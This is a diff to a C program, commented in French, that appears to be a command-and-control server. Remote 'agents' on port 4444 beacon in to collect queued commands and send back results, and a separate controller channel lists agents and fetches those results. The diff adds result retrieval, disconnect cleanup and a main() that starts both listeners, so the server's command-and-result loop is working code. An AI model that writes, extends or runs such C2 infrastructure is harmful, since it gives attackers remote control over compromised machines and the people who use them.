@@ -5,6 +5,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <unistd.h>
 
 
 #define PORT_AGENTS 4444
@@ -62,6 +63,7 @@ int handle_beacon(int client_socket, const char *agent_id) {
         send(client_socket, agents[idx].task, strlen(agents[idx].task), 0);
         memset(agents[idx].task, 0, sizeof(agents[idx].task));
         agents[idx].has_task = 0;
+        printf("[*] Commande envoyée à l'agent %s\n", agent_id);
     } else {
         send(client_socket, "NONE", 4, 0);
     }
@@ -81,7 +83,6 @@ int handle_result(int client_socket, const char *agent_id, const char *result)
     strncpy(agents[idx].result, result, sizeof(agents[idx].result) - 1);
     agents[idx].has_result = 1;
     pthread_mutex_unlock(&agents_mutex);
-    send(client_socket, "OK", 2, 0);
     return 0;
 }
 
@@ -89,6 +90,7 @@ void *handle_agent_connection(void *arg)
 {
     int client_sock = (int)(intptr_t)arg;
     char buf[2048] = {0};
+    char current_agent_id[64] = {0};  // mémorise l'id de cet agent
 
     while (1) {
         memset(buf, 0, sizeof(buf));
@@ -99,18 +101,27 @@ void *handle_agent_connection(void *arg)
 
         char type[16] = {0};
         char agent_id[64] = {0};
-        char result[1024] = {0};
 
         if (sscanf(buf, "%15s %63s", type, agent_id) < 2)
             continue;
 
         if (strcmp(type, "BEACON") == 0) {
+            strncpy(current_agent_id, agent_id, sizeof(current_agent_id) - 1);
             handle_beacon(client_sock, agent_id);
         } else if (strcmp(type, "RESULT") == 0) {
-            // le résultat commence après "RESULT <id> "
             char *res_start = buf + strlen("RESULT ") + strlen(agent_id) + 1;
             handle_result(client_sock, agent_id, res_start);
         }
+    }
+
+    // nettoyage à la déconnexion
+    if (current_agent_id[0] != '\0') {
+        pthread_mutex_lock(&agents_mutex);
+        int idx = find_agent(current_agent_id);
+        if (idx >= 0)
+            memset(&agents[idx], 0, sizeof(AgentSlot));
+        pthread_mutex_unlock(&agents_mutex);
+        printf("[!] Agent %s déconnecté\n", current_agent_id);
     }
 
     close(client_sock);
@@ -206,10 +217,37 @@ void *listen_controler(void *arg)
             }
             pthread_mutex_unlock(&agents_mutex);
             send(ctrl_sock, list, strlen(list), 0);
-        }else {
+        } else if (strncmp(buf, "RESULT ", 7) == 0) {
+            char agent_id[64] = {0};
+            sscanf(buf, "RESULT %63s", agent_id);
+            pthread_mutex_lock(&agents_mutex);
+            int idx = find_agent(agent_id);
+            if (idx < 0 || !agents[idx].has_result) {
+                pthread_mutex_unlock(&agents_mutex);
+                send(ctrl_sock, "NONE", 4, 0);
+            } else {
+                send(ctrl_sock, agents[idx].result, strlen(agents[idx].result), 0);
+                memset(agents[idx].result, 0, sizeof(agents[idx].result));
+                agents[idx].has_result = 0;
+                pthread_mutex_unlock(&agents_mutex);
+            }
+        } else {
             send(ctrl_sock, "UNKNOWN", 7, 0);
         }
         close(ctrl_sock);
     }
     return NULL;
+}
+
+int main(){
+    memset(agents, 0, sizeof(agents));
+    pthread_t t_agents, t_ctrl;
+
+    pthread_create(&t_agents, NULL, listen_agents, NULL);
+    pthread_create(&t_ctrl, NULL, listen_controler, NULL);
+
+    pthread_join(t_agents, NULL);
+    pthread_join(t_ctrl, NULL);
+
+    return 0;
 }
